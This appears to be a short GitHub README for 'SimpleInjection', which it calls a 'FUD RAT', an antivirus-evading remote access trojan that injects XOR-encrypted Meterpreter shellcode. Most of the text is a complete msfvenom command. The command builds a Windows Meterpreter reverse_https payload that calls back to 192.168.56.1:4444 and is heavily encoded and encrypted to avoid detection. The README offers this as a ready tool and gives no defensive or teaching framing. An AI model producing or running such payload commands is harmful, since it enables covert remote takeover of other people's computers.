# SimpleInjection
FUD RAT (Xor encrypted Meterpreter, shellcode injector)

watch my video on Youtube: https://youtu.be/9TmrtGeIiUY

to generate shellcode:

msfvenom -p windows/x64/meterpreter/reverse_https lhost=192.168.56.1 lport=4444 -e x64/zutto_dekiru -i 20 --encrypt xor --encrypt-key byte4RR4Y -f csharp


![7R5CcVwJfzn3](https://user-images.githubusercontent.com/121404035/210647849-107fb416-314d-4eeb-a4e1-ef55199f8b42.png)
